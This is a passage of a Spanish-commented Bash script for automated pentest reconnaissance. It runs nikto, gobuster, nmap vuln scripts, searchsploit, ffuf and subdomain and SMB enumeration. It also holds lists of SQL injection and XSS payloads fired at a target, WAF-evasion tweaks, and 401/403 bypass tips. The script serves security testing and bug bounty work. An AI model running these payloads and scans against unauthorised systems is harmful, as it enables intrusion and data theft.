        [[ -n "$INTEL_CMS" ]] && intel_log "CMS: ${INTEL_CMS} — gobuster y SQLi usarán rutas específicas"
    fi
    echo
}

# ─── MÓDULO 7: NIKTO SCAN ───────────────────────────────────────
modulo_nikto() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    command -v nikto >/dev/null 2>&1 || { warn "nikto no disponible."; return; }

    log "MÓDULO 7: Nikto Web Vulnerability Scanner"
    tip "Nikto es ruidoso. En Bug Bounty verifica que esté permitido en el scope."

    local port="${WEB_PORTS[0]}"
    local output_file="${OUTPUT_DIR}/web/nikto_${port}.txt"

    cmd_show "nikto -host ${TARGET} -port ${port} -output ${output_file} -Format txt"

    nikto -host "${TARGET}" -port "${port}" -output "${output_file}" -Format txt 2>/dev/null | tee /tmp/nikto_live.txt

    if [[ -f "$output_file" ]]; then
        local vulns
        vulns=$(grep -c "OSVDB\|CVE\|+ " "$output_file" 2>/dev/null || echo "0")
        ok "Nikto completado. Hallazgos potenciales: ${vulns}"

        local nikto_findings
        nikto_findings=$(grep "^+" "$output_file" | head -20)
        [[ -n "$nikto_findings" ]] && add_finding "MEDIO" "Nikto Web Findings" "<pre>${nikto_findings}</pre>"
    fi
    echo
}

# ─── MÓDULO 8: DIRECTORY FUZZING ────────────────────────────────
modulo_gobuster() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    command -v gobuster >/dev/null 2>&1 || { warn "gobuster no disponible. Instala: sudo apt install gobuster"; return; }

    log "MÓDULO 8: Directory & File Fuzzing (gobuster)"

    # ── INTEL READ: ajustar según lo descubierto ──
    # Wordlist base
    local wordlist="/usr/share/wordlists/dirb/common.txt"
    [[ -f "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" ]] && \
        wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"

    # Si whatweb detectó un CMS, usar su wordlist específica
    if [[ -n "$INTEL_WORDLIST_EXTRA" && -f "$INTEL_WORDLIST_EXTRA" ]]; then
        wordlist="$INTEL_WORDLIST_EXTRA"
        intel_log "Usando wordlist específica de ${INTEL_CMS}: ${wordlist}"
    fi

    if [[ ! -f "$wordlist" ]]; then
        warn "Wordlist no encontrada. Instala: sudo apt install seclists dirb"
        return
    fi

    # Ajustar threads según WAF
    local threads=30
    if [[ "$INTEL_WAF_DETECTED" == "true" ]]; then
        threads=5
        intel_log "WAF detectado → reduciendo threads a ${threads} para evasión"
    fi

    # Extensiones según tecnología detectada
    local extensions="php,html,txt,bak,old,zip,js,json,config,xml"
    if [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " aspnet " ]]; then
        extensions="asp,aspx,config,bak,txt,xml"
        intel_log "ASP.NET detectado → usando extensiones: ${extensions}"
    elif [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " python " ]]; then
        extensions="py,txt,bak,zip,json,cfg,conf"
        intel_log "Python detectado → usando extensiones: ${extensions}"
    elif [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " nodejs " ]]; then
        extensions="js,json,txt,bak,env,config"
        intel_log "Node.js detectado → buscando .env y configs JS"
    fi

    local proto="http"
    local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local url="${ORIGINAL_URL:-${proto}://${TARGET}:${port}}"
    local output_file="${OUTPUT_DIR}/web/gobuster_${port}.txt"

    cmd_show "gobuster dir -u ${url} -w ${wordlist} -t ${threads} -x ${extensions} -o ${output_file} -q"

    gobuster dir -u "${url}" \
        -w "${wordlist}" \
        -t "${threads}" \
        -x "${extensions}" \
        -o "${output_file}" \
        -q \
        --no-error 2>/dev/null | tee /tmp/gobuster_live.txt

    if [[ -f "$output_file" ]]; then
        local found
        found=$(grep -c "Status:" "$output_file" 2>/dev/null || echo "0")
        ok "Rutas encontradas: ${found}"

        # Destacar hallazgos interesantes
        local interesting
        interesting=$(grep -E "Status: (200|301|302|401|403)" "$output_file" | head -30)
        [[ -n "$interesting" ]] && add_finding "MEDIO" "Directorios/Archivos Encontrados (${found})" "<pre>${interesting}</pre>"

        # Alertar sobre archivos sensibles
        local sensitive
        sensitive=$(grep -iE "(backup|\.bak|\.old|\.zip|admin|config|\.env|passwd|shadow|\.git)" "$output_file" 2>/dev/null)
        [[ -n "$sensitive" ]] && add_finding "ALTO" "Archivos Sensibles Potenciales" "<pre>${sensitive}</pre>"

        # ── INTEL WRITE: guardar rutas sensibles para otros módulos ──
        while IFS= read -r path_line; do
            local clean_path
            clean_path=$(echo "$path_line" | grep -oE "^/[^ ]+" | head -1)
            [[ -n "$clean_path" ]] && INTEL_SENSITIVE_PATHS+=("${url}${clean_path}")
        done < <(grep -iE "admin|api|config|login|dashboard|panel|debug" "$output_file" 2>/dev/null | head -20)

        # URLs con parámetros para SQLi/XSS
        while IFS= read -r url_line; do
            INTEL_INJECTABLE_URLS+=("${url_line}")
        done < <(grep -E "Status: 200" "$output_file" | grep -E "\.php|\.asp" | grep -oE "^/[^ ]+" | sed "s|^|${url}|" | head -10)

        intel_log "Rutas sensibles registradas para SQLi/XSS: ${#INTEL_INJECTABLE_URLS[@]}"
        # IDOR: detectar rutas con IDs numéricos
        while IFS= read -r idor_path; do
            [[ "$idor_path" =~ [0-9]+$ || "$idor_path" =~ id|user|order|account ]] &&                 INTEL_INJECTABLE_URLS+=("${url}${idor_path}")
        done < <(grep -E "Status: 200" "$output_file" | grep -oE "^/[a-zA-Z0-9/_-]+" | head -10)
    fi
    echo
}

# ─── MÓDULO 9: SUBDOMAIN ENUMERATION ────────────────────────────
modulo_subdominios() {
    is_domain "$TARGET" || { log "Target es IP. Saltando enumeración de subdominios."; return; }
    command -v subfinder >/dev/null 2>&1 || { warn "subfinder no disponible. Instala: go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"; return; }

    log "MÓDULO 9: Subdomain Enumeration (subfinder)"
    local output_file="${OUTPUT_DIR}/recon/subdominios.txt"

    cmd_show "subfinder -d ${TARGET} -o ${output_file} -all -silent"

    subfinder -d "${TARGET}" -o "${output_file}" -all -silent 2>/dev/null

    if [[ -f "$output_file" ]]; then
        local count
        count=$(wc -l < "$output_file")
        ok "Subdominios encontrados: ${count}"
        head -20 "$output_file"
        add_finding "INFO" "Subdominios Encontrados (${count})" "<pre>$(cat "${output_file}")</pre>"
    fi
    echo
}

# ─── MÓDULO 10: SMB ENUMERATION ─────────────────────────────────
modulo_smb() {
    echo "$OPEN_PORTS_CSV" | grep -qE "(445|139)" || return
    command -v enum4linux-ng >/dev/null 2>&1 || { warn "enum4linux-ng no disponible. Instala: sudo apt install enum4linux-ng"; return; }

    log "MÓDULO 10: SMB Enumeration (enum4linux-ng)"
    tip "SMB suele tener misconfigs críticas: shares abiertos, RID brute, null sessions."

    local output_file="${OUTPUT_DIR}/recon/smb_enum.txt"
    cmd_show "enum4linux-ng -A ${TARGET} -oA ${OUTPUT_DIR}/recon/smb"

    enum4linux-ng -A "${TARGET}" -oA "${OUTPUT_DIR}/recon/smb" 2>/dev/null | tee "${output_file}"

    if [[ -f "$output_file" ]]; then
        local shares
        shares=$(grep -i "share\|disk\|IPC" "$output_file" | head -10)
        [[ -n "$shares" ]] && add_finding "ALTO" "SMB Shares Detectados" "<pre>${shares}</pre>"
    fi
    echo
}

# ─── MÓDULO 11: VULNERABILITY SCAN ──────────────────────────────
modulo_vuln_scan() {
    [[ -z "$OPEN_PORTS_CSV" ]] && return

    log "MÓDULO 11: Vulnerability Scan (nmap vuln scripts)"
    tip "Este módulo puede tardar varios minutos. Ideal ejecutar en CTF y entornos controlados."

    local base="${OUTPUT_DIR}/nmap/${TARGET//\//_}_vulns"
    cmd_show "nmap -n -Pn --min-rate 2000 -vv --script vuln -p${OPEN_PORTS_CSV} -oA ${base} ${TARGET}"

    nmap -n -Pn --min-rate 2000 -vv --script vuln \
        -p"${OPEN_PORTS_CSV}" \
        -oA "${base}" \
        "${TARGET}" 2>/dev/null

    if [[ -f "${base}.xml" ]]; then
        xsltproc "${base}.xml" -o "${base}.html" 2>/dev/null && ok "HTML: ${base}.html"

        # Extraer CVEs encontrados
        local cves
        cves=$(grep -oP 'CVE-[0-9]{4}-[0-9]+' "${base}.nmap" 2>/dev/null | sort -u)
        if [[ -n "$cves" ]]; then
            warn "CVEs potenciales detectados:"
            echo "${cves}"
            add_finding "CRÍTICO" "CVEs Detectados por Nmap" "<pre>${cves}</pre>"
        fi
    fi
    echo
}

# ─── MÓDULO 12: SEARCHSPLOIT ────────────────────────────────────
modulo_searchsploit() {
    command -v searchsploit >/dev/null 2>&1 || { warn "searchsploit no disponible."; return; }
    [[ -f "${OUTPUT_DIR}/nmap/${TARGET//\//_}_version.nmap" ]] || return

    log "MÓDULO 12: Exploit Search (searchsploit)"
    tip "Busca exploits para los servicios detectados en el escaneo de versiones."

    local version_file="${OUTPUT_DIR}/nmap/${TARGET//\//_}_version.nmap"
    local output_file="${OUTPUT_DIR}/exploits/searchsploit_results.txt"

    cmd_show "searchsploit --nmap ${version_file} -t"

    searchsploit --nmap "${version_file}" 2>/dev/null | tee "${output_file}"

    if [[ -s "$output_file" ]]; then
        local exploit_count
        exploit_count=$(grep -c "Exploit Title" "$output_file" 2>/dev/null || echo "1")
        add_finding "ALTO" "Exploits Públicos Encontrados (searchsploit)" "<pre>$(head -40 "${output_file}")</pre>"

        # ── INTEL READ+WRITE: búsquedas extra según tecnologías detectadas ──
        if [[ ${#INTEL_TECHNOLOGIES[@]} -gt 0 ]]; then
            intel_log "Buscando exploits adicionales para: ${INTEL_TECHNOLOGIES[*]}"
            local extra_file="${OUTPUT_DIR}/exploits/searchsploit_extra.txt"
            for tech in "${INTEL_TECHNOLOGIES[@]}"; do
                echo "=== ${tech} ===" >> "$extra_file"
                searchsploit "$tech" 2>/dev/null | grep -iE "rce|exec|inject|upload|auth bypass|lfi|rfi|sqli" | head -10 >> "$extra_file"
            done
            if [[ -s "$extra_file" ]]; then
                add_finding "ALTO" "Exploits por Tecnología Detectada (${INTEL_TECHNOLOGIES[*]})" "<pre>$(head -50 "${extra_file}")</pre>"
            fi
        fi

        # Si SQLi fue encontrado, buscar exploits de la BD
        if [[ "$INTEL_SQLI_FOUND" == "true" ]]; then
            intel_log "SQLi confirmado → buscando exploits de escalada via ${db_type:-sql}"
        fi
    fi
    echo
}

# ─── MÓDULO 13: SQL INJECTION BÁSICO ────────────────────────────
modulo_sqli() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && warn "Sin puertos web. Saltando SQLi." && return

    log "MÓDULO 13: SQL Injection — Pruebas Básicas (curl)"
    tip "Se prueban payloads básicos en parámetros GET. No reemplaza sqlmap, pero da señales rápidas."

    local proto="http"
    local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local output_file="${OUTPUT_DIR}/web/sqli_results.txt"
    local vuln_count=0
    local findings_detail=""

    # ── INTEL READ: adaptar SQLi según contexto ──
    if [[ "$INTEL_WAF_DETECTED" == "true" ]]; then
        intel_log "WAF detectado (${INTEL_WAF_NAME}) → añadiendo payloads con evasión WAF"
        tip "WAF activo: se usan payloads con comentarios SQL, case mixing y codificación"
    fi

    # Si gobuster encontró rutas con PHP/ASP, agregarlas como targets
    if [[ ${#INTEL_INJECTABLE_URLS[@]} -gt 0 ]]; then
        intel_log "Usando ${#INTEL_INJECTABLE_URLS[@]} URLs encontradas por gobuster como targets adicionales"
    fi

    # Si MySQL detectado por nmap, priorizar payloads MySQL
    local db_type="generic"
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " mysql " ]]      && db_type="mysql"      && intel_log "MySQL confirmado → priorizando payloads MySQL/MariaDB"
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " postgresql " ]] && db_type="postgresql" && intel_log "PostgreSQL confirmado → usando payloads PG"
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " aspnet " ]]     && db_type="mssql"      && intel_log "ASP.NET → posible MSSQL, usando payloads MSSQL"

    # Payloads base + evasión WAF si aplica
    local PAYLOADS=(
        "'"
        "'--"
        "' OR '1'='1"
        "' OR 1=1--"
        "\" OR \"1\"=\"1"
        "1' ORDER BY 1--"
        "1' ORDER BY 999--"
        "' AND SLEEP(2)--"
        "1; SELECT SLEEP(2)--"
        "' AND 1=CONVERT(int,@@version)--"
        "' UNION SELECT NULL--"
        "' UNION SELECT NULL,NULL--"
        "admin'--"
        "' OR 'x'='x"
    )

    # Errores típicos de BD que indican SQLi
    local DB_ERRORS=(
        "you have an error in your sql"
        "warning: mysql"
        "unclosed quotation mark"
        "quoted string not properly terminated"
        "odbc sql server driver"
        "microsoft ole db provider"
        "ora-01756"
        "sqlite_error"
        "pg_query"
        "postgresql.*error"
        "syntax error.*sql"
        "microsoft jet database"
        "division by zero"
    )

    echo -e "  Base URL: ${C_CYN}${base_url}${C_RST}"
    echo -e "  Payloads: ${#PAYLOADS[@]} | Errores monitoreados: ${#DB_ERRORS[@]}"
    echo

    # Buscar parámetros GET en la página principal
    local page_links
    page_links=$(curl -skL --max-time 10 "${base_url}" 2>/dev/null | \
        grep -oE '(href|action|src)="[^"]*\?[^"]*"' | \
        grep -oE '"[^"]*\?[^"]*"' | tr -d '"' | \
        sed "s|^/|${base_url}/|g" | head -15)

    if [[ -z "$page_links" ]]; then
        # Si no hay links con params, probar rutas comunes con id=1
        page_links=$(printf "%s\n%s\n%s\n%s\n%s"             "${base_url}/?id=1"             "${base_url}/index.php?id=1"             "${base_url}/search?q=test"             "${base_url}/product?id=1"             "${base_url}/page?id=1")
        warn "No se encontraron parámetros GET en la página. Probando rutas genéricas."
    fi

    echo "${page_links}" | while IFS= read -r url_param; do
        [[ -z "$url_param" ]] && continue
        # Extraer la parte base y el parámetro
        local base_param
        base_param=$(echo "$url_param" | cut -d'?' -f1)
        local params
        params=$(echo "$url_param" | cut -d'?' -f2)

        echo -e "  ${C_DIM}Testeando:${C_RST} ${C_CYN}${url_param}${C_RST}"

        for payload in "${PAYLOADS[@]}"; do
            local encoded_payload
            encoded_payload=$(python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")

            local test_url="${base_param}?${params}${encoded_payload}"
            local response
            response=$(curl -skL --max-time 8 \
                -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
                "${test_url}" 2>/dev/null | tr '[:upper:]' '[:lower:]')

            for err_pattern in "${DB_ERRORS[@]}"; do
                if echo "$response" | grep -qiE "$err_pattern"; then
                    local hit="⚠ SQLi POTENCIAL: ${test_url} → Trigger: '${err_pattern}'"
                    echo -e "  ${C_RED}${hit}${C_RST}"
                    echo "$hit" >> "${output_file}"
                    findings_detail+="<tr><td class='vuln'>POTENCIAL</td><td>${test_url}</td><td><code>${payload}</code></td><td>${err_pattern}</td></tr>"
                    ((vuln_count++)) || true
                    break
                fi
            done

            # Detectar time-based (SLEEP)
            if [[ "$payload" == *"SLEEP"* ]]; then
                local start_time end_time elapsed
                start_time=$(date +%s)
                curl -skL --max-time 10 \
                    -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
                    "${test_url}" >/dev/null 2>&1
                end_time=$(date +%s)
                elapsed=$(( end_time - start_time ))
                if (( elapsed >= 2 )); then
                    local time_hit="⚠ TIME-BASED SQLi: ${test_url} → Delay: ${elapsed}s"
                    echo -e "  ${C_RED}${time_hit}${C_RST}"
                    echo "$time_hit" >> "${output_file}"
                    findings_detail+="<tr><td class='critical'>TIME-BASED</td><td>${test_url}</td><td><code>${payload}</code></td><td>Delay ${elapsed}s</td></tr>"
                    ((vuln_count++)) || true
                fi
            fi
        done
    done

    echo
    if (( vuln_count > 0 )); then
        INTEL_SQLI_FOUND=true
        # Construir comando sqlmap inteligente basado en tecnología detectada
        local sqlmap_extra=""
        [[ "$db_type" == "mysql" ]]      && sqlmap_extra="--dbms=mysql"
        [[ "$db_type" == "postgresql" ]] && sqlmap_extra="--dbms=postgresql"
        [[ "$db_type" == "mssql" ]]      && sqlmap_extra="--dbms=mssql"
        [[ "$INTEL_WAF_DETECTED" == "true" ]] && sqlmap_extra+=" --tamper=between,charencode,randomcase --level=5 --risk=3"

        add_finding "CRÍTICO" "SQL Injection — ${vuln_count} Indicios Encontrados" \
            "<table class='vuln-table'><tr><th>Tipo</th><th>URL</th><th>Payload</th><th>Trigger</th></tr>${findings_detail}</table><br><b>Siguiente paso recomendado:</b><br><code>sqlmap -u "URL_VULNERABLE" --dbs --batch ${sqlmap_extra}</code>"
        intel_log "SQLi confirmado → XSS usará estas URLs también | searchsploit buscará exploits de ${db_type}"
    else
        ok "No se detectaron indicios obvios de SQLi básico."
        add_finding "INFO" "SQL Injection" "No se detectaron errores de BD con payloads básicos. Recomienda: sqlmap completo."
    fi

    [[ -f "$output_file" ]] && ok "Resultados SQLi: ${output_file}"
    echo
}

# ─── MÓDULO 14: XSS BÁSICO ──────────────────────────────────────
modulo_xss() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && warn "Sin puertos web. Saltando XSS." && return

    log "MÓDULO 14: XSS — Cross-Site Scripting Básico (curl)"
    tip "Pruebas de reflexión de payloads. Un XSS real requiere navegador para ejecutar."

    local proto="http"
    local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local output_file="${OUTPUT_DIR}/web/xss_results.txt"
    local vuln_count=0
    local findings_detail=""

    # Canary token único para esta sesión
    local CANARY="WTavo$(date +%s)"

    # Payloads XSS — del más simple al más evasivo
    local XSS_PAYLOADS=(
        "<script>alert('${CANARY}')</script>"
        "<img src=x onerror=alert('${CANARY}')>"
        "<svg onload=alert('${CANARY}')>"
        "javascript:alert('${CANARY}')"
        "'><script>alert('${CANARY}')</script>"
        "\"><img src=x onerror=alert('${CANARY}')>"
        "<body onload=alert('${CANARY}')>"
        "<iframe src=\"javascript:alert('${CANARY}')\"></iframe>"
        "<!--<script>alert('${CANARY}')</script>-->"
        "<ScRiPt>alert('${CANARY}')</ScRiPt>"
        "%3Cscript%3Ealert('${CANARY}')%3C/script%3E"
        "<img src=\"\" onerror=\"alert('${CANARY}')\">"
        "<details open ontoggle=alert('${CANARY}')>"
        "<video><source onerror=alert('${CANARY}')>"
    )

    echo -e "  Base URL: ${C_CYN}${base_url}${C_RST}"
    echo -e "  Canary token: ${C_YEL}${CANARY}${C_RST}"
    echo -e "  Payloads: ${#XSS_PAYLOADS[@]}"
    echo

    # Extraer formularios y parámetros GET
    local page_html
    page_html=$(curl -skL --max-time 10 \
        -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
        "${base_url}" 2>/dev/null)

    local page_links
    page_links=$(echo "$page_html" | \
        grep -oE '(href|action)="[^"]*"' | \
        grep -oE '"[^"]*"' | tr -d '"' | \
        grep '?' | sed "s|^/|${base_url}/|g" | head -10)

    # Incluir la URL base con params de prueba
    local test_urls=("${base_url}/?q=TEST" "${base_url}/search?q=TEST" "${base_url}/?s=TEST")
    while IFS= read -r u; do [[ -n "$u" ]] && test_urls+=("$u"); done <<< "$page_links"

    for url_template in "${test_urls[@]}"; do
        local base_part
        base_part=$(echo "$url_template" | cut -d'?' -f1)
        local param_part
        param_part=$(echo "$url_template" | cut -d'?' -f2 | sed 's/=.*//')
        [[ -z "$param_part" ]] && param_part="q"

        echo -e "  ${C_DIM}Testeando:${C_RST} ${C_CYN}${base_part}?${param_part}=...${C_RST}"

        for payload in "${XSS_PAYLOADS[@]}"; do
            local encoded
            encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''${payload}'''))" 2>/dev/null || echo "$payload")

            local test_url="${base_part}?${param_part}=${encoded}"
            local response
            response=$(curl -skL --max-time 8 \
                -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
                "${test_url}" 2>/dev/null)

            # Verificar si el CANARY se refleja sin encoding
            if echo "$response" | grep -q "${CANARY}"; then
                # Verificar si está dentro de un contexto ejecutable
                local context="reflexión"
                echo "$response" | grep -q "<script>" && context="dentro de <script>"
                echo "$response" | grep -q "onerror=" && context="dentro de atributo evento"
                echo "$response" | grep -q "onload=" && context="dentro de onload"

                local hit="⚠ XSS REFLEJADO: ${base_part}?${param_part}= | Payload: ${payload} | Contexto: ${context}"
                echo -e "  ${C_RED}${hit}${C_RST}"
                echo "$hit" >> "${output_file}"
                local safe_payload="${payload//</LESSTHAN}"; safe_payload="${safe_payload//>/GREATERTHAN}"
                findings_detail+="<tr><td class='critical'>REFLEJADO</td><td>${base_part}?${param_part}=</td><td><code>${safe_payload}</code></td><td>${context}</td></tr>"
                ((vuln_count++)) || true
                break  # Un hit por URL es suficiente para señalar
            fi

            # Verificar si el payload llega parcialmente (posible bypass de filtro)
            if echo "$response" | grep -qiE "alert|onerror|onload|<script|<img|<svg"; then
                if echo "$response" | grep -q "WTavo"; then
                    warn "Reflexión parcial detectada en: ${test_url}"
                    findings_detail+="<tr><td class='medium'>PARCIAL</td><td>${base_part}?${param_part}=</td><td><code>${payload}</code></td><td>Reflexion parcial - revisar manualmente</td></tr>"
                fi
            fi
        done

        # Test XSS en headers (User-Agent, Referer, X-Forwarded-For)
        local header_response
        header_response=$(curl -skL --max-time 8 \
            -H "User-Agent: <script>alert('${CANARY}')</script>" \
            -H "Referer: <script>alert('${CANARY}')</script>" \
            -H "X-Forwarded-For: <script>alert('${CANARY}')</script>" \
            "${base_url}" 2>/dev/null)

        if echo "$header_response" | grep -q "${CANARY}"; then
            local h_hit="⚠ XSS EN HEADER: ${base_url} → Reflexión via HTTP Header"
            echo -e "  ${C_RED}${h_hit}${C_RST}"
            echo "$h_hit" >> "${output_file}"
            findings_detail+="<tr><td class='critical'>HEADER-BASED</td><td>${base_url}</td><td><code>Header injection</code></td><td>User-Agent / Referer / X-Forwarded-For</td></tr>"
            ((vuln_count++)) || true
        fi
    done

    # POST form testing
    local forms
    # Extract form action URLs from page HTML
    local forms_raw
    forms_raw=$(echo "$page_html" | grep -oi "action='[^']*'\|action=\"[^\"]*\"" | grep -oE "['\"][^'\"]+['\"]" | tr -d "'\""  | head -5)
    local forms="$forms_raw" 
    if [[ -n "$forms" ]]; then
        echo
        log "Testeando formularios POST para XSS..."
        while IFS= read -r form_action; do
            [[ -z "$form_action" ]] && continue
            [[ "$form_action" != http* ]] && form_action="${base_url}${form_action}"
            local post_resp
            post_resp=$(curl -skL --max-time 8 \
                -X POST \
                -d "q=<script>alert('${CANARY}')</script>&search=<img src=x onerror=alert('${CANARY}')>&input=${CANARY}" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                "${form_action}" 2>/dev/null)

            if echo "$post_resp" | grep -q "${CANARY}"; then
                local post_hit="⚠ XSS POST: ${form_action}"
                echo -e "  ${C_RED}${post_hit}${C_RST}"
                echo "$post_hit" >> "${output_file}"
                findings_detail+="<tr><td class='critical'>POST FORM</td><td>${form_action}</td><td><code>POST body injection</code></td><td>Reflexión en respuesta POST</td></tr>"
                ((vuln_count++)) || true
            fi
        done <<< "$forms"
    fi

    echo
    if (( vuln_count > 0 )); then
        add_finding "CRÍTICO" "XSS — ${vuln_count} Puntos de Inyección Detectados" \
            "<table class='vuln-table'><tr><th>Tipo</th><th>URL</th><th>Payload</th><th>Contexto</th></tr>${findings_detail}</table><br><b>Siguiente paso:</b> Confirmar en navegador real. Usar Burp Suite para análisis profundo."
    else
        ok "No se detectó XSS reflejado básico."
        add_finding "INFO" "XSS" "No se detectó reflexión de payloads básicos. Recomienda: Burp Suite Active Scan para XSS almacenado y DOM-based."
    fi

    [[ -f "$output_file" ]] && ok "Resultados XSS: ${output_file}"
    echo
}

# ─── MÓDULO 15: ENDPOINT & API DISCOVERY ────────────────────────
modulo_endpoints() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && warn "Sin puertos web. Saltando endpoints." && return
    command -v ffuf >/dev/null 2>&1 || { warn "ffuf no disponible. Instala: sudo apt install ffuf"; return; }

    log "MÓDULO 15: Endpoint & API Discovery (ffuf)"
    tip "APIs modernas usan rutas como /api/v1/, /graphql, /swagger, /actuator — muy comunes en bug bounty."

    local proto="http"
    local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local output_dir="${OUTPUT_DIR}/web/endpoints"
    mkdir -p "$output_dir"

    # ── Wordlist de APIs y endpoints modernos ──
    local API_WORDLIST="${output_dir}/api_endpoints.txt"
    cat > "$API_WORDLIST" << 'WORDLIST'
api
api/v1
api/v2
api/v3
api/user
api/users
api/auth
api/login
api/register
api/logout
api/token
api/refresh
api/admin
api/config
api/settings
api/data
api/search
api/upload
api/download
api/status
api/health
api/info
api/version
api/debug
graphql
graphiql
playground
swagger
swagger-ui
swagger-ui.html
swagger.json
swagger.yaml
openapi.json
openapi.yaml
api-docs
api-docs.json
v1
v2
v3
rest
rest/api
rpc
jsonrpc
soap
wsdl
actuator
actuator/health
actuator/info
actuator/env
actuator/beans
actuator/mappings
actuator/metrics
actuator/dump
actuator/trace
actuator/logfile
actuator/heapdump
.well-known
.well-known/security.txt
.well-known/openid-configuration
robots.txt
sitemap.xml
sitemap_index.xml
security.txt
humans.txt
crossdomain.xml
clientaccesspolicy.xml
feed
feed.xml
rss
rss.xml
atom.xml
wp-json
wp-json/wp/v2
wp-login.php
wp-admin
admin
admin/api
dashboard
panel
console
manager
portal
user
users
profile
account
auth
login
logout
register
signup
signin
reset
forgot
oauth
oauth/token
oauth/authorize
callback
redirect
webhook
webhooks
upload
uploads
files
static
assets
media
images
cdn
socket.io
ws
websocket
health
ping
status
metrics
monitor
debug
test
dev
staging
internal
private
backup
export
import
WORDLIST

    echo -e "  Base URL: ${C_CYN}${base_url}${C_RST}"
    local wl_count; wl_count=$(wc -l < "$API_WORDLIST")
    echo -e "  Endpoints en wordlist: ${wl_count}"
    echo

    local ffuf_output="${output_dir}/ffuf_endpoints.json"
    cmd_show "ffuf -u ${base_url}/FUZZ -w ${API_WORDLIST} -mc 200,201,204,301,302,401,403,405 -t 30 -o ${ffuf_output} -of json -s"

    ffuf -u "${base_url}/FUZZ" \
        -w "$API_WORDLIST" \
        -mc 200,201,204,301,302,401,403,405 \
        -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
        -H "Accept: application/json, text/html" \
        -t 30 \
        -o "${ffuf_output}" \
        -of json \
        -s 2>/dev/null

    # Parsear resultados
    if [[ -f "$ffuf_output" ]]; then
        local results_txt="${output_dir}/endpoints_found.txt"
        local ffuf_out_copy="${ffuf_output}"
        local results_copy="${results_txt}"
        # Parse ffuf JSON output
        local results_txt="${output_dir}/endpoints_found.txt"
        local found_count=0
        if command -v jq >/dev/null 2>&1; then
            jq -r '.results[] | "[\(.status)] \(.url) (size:\(.length))"' "${ffuf_output}" 2>/dev/null | tee "${results_txt}"
            found_count=$(jq '.results | length' "${ffuf_output}" 2>/dev/null || echo 0)
        else
            found_count=$(grep -c "url" "${ffuf_output}" 2>/dev/null || echo 0)
            grep -oE '"url":"[^"]*"' "${ffuf_output}" 2>/dev/null | cut -d'"' -f4 > "${results_txt}" || true
        fi

        ok "Endpoints/APIs encontrados: ${found_count}"

        if (( found_count > 0 )); then
            # Clasificar hallazgos por severidad
            local critical_eps=""
            local interesting_eps=""

            if [[ -f "$results_txt" ]]; then
                # Endpoints críticos
                critical_eps=$(grep -iE "admin|actuator|debug|config|env|heapdump|dump|backup|internal|private|swagger|graphql|api-docs" "$results_txt" 2>/dev/null)
                # Con 401/403 (existentes pero protegidos)
                interesting_eps=$(grep -E "\[401\]|\[403\]" "$results_txt" 2>/dev/null | head -20)

                [[ -n "$critical_eps" ]] && add_finding "ALTO" \
                    "Endpoints Críticos Encontrados" \
                    "<pre>${critical_eps}</pre><br><b>Tip:</b> Endpoints como /actuator, /admin, /debug pueden exponer datos sensibles."

                [[ -n "$interesting_eps" ]] && add_finding "MEDIO" \
                    "Endpoints Protegidos (401/403) — Posible Bypass" \
                    "<pre>${interesting_eps}</pre><br><b>Tip:</b> Prueba bypass con: X-Original-URL, X-Rewrite-URL, ..;/ path traversal."

                local all_eps
                all_eps=$(cat "$results_txt")
                add_finding "INFO" "Todos los Endpoints Encontrados (${found_count})" "<pre>${all_eps}</pre>"
            fi
        fi
    fi

    # ── Detección especial: GraphQL ──
    echo
    log "Verificando GraphQL..."
    local gql_endpoints=("/graphql" "/graphiql" "/playground" "/api/graphql" "/v1/graphql")
    local gql_found=""
    for ep in "${gql_endpoints[@]}"; do
        local gql_url="${base_url}${ep}"
        local gql_resp
        gql_resp=$(curl -skL --max-time 8 \
            -X POST \
            -H "Content-Type: application/json" \
            -d '{"query":"{__typename}"}' \
            "${gql_url}" 2>/dev/null)

        if echo "$gql_resp" | grep -qiE "__typename|data|graphql|errors"; then
            warn "GraphQL DETECTADO: ${gql_url}"
            gql_found+="${gql_url}\n"
            INTEL_GRAPHQL_URL="${gql_url}"
            INTEL_API_ENDPOINTS+=("${gql_url}")
            intel_log "GraphQL guardado → SQLi/XSS intentarán inyección en queries GraphQL"
            add_finding "ALTO" "GraphQL Endpoint Detectado" \
                "URL: <b>${gql_url}</b><br>Respuesta sugiere GraphQL activo.<br><b>Siguiente paso:</b> graphql-cop -t ${gql_url} o InQL en Burp."
        fi
    done

    # ── Detección: Swagger / OpenAPI ──
    echo
    log "Verificando Swagger / OpenAPI docs..."
    local swagger_eps=("/swagger.json" "/swagger.yaml" "/openapi.json" "/api-docs" "/swagger-ui.html" "/v2/api-docs" "/v3/api-docs")
    for ep in "${swagger_eps[@]}"; do
